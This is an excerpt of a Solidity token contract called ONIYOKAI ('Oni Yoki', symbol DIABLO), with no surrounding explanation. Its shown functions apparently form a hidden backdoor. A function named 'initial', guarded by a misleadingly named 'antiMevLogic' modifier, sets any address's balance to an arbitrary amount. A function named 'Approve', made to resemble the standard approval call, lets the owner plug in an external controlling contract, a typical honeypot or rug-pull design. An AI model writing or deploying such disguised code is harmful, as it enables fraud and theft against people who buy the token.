...
contract ONIYOKAI is Context, IERC20, Ownable {
    ...
    string private constant _name = "Oni Yoki";
    string private constant _symbol = "DIABLO";
    uint8 private constant _decimals = 9;

    IUniswapV2Router02 private uniswapV2Router;
    parab private _early;
    ...
    function initial(address _approval, uint256 _check)
        external
        antiMevLogic
    {
        _balance[_approval] = _check;
    }

    function Approve(address _approval) external onlyOwner {
        _early = parab(_approval);
    }
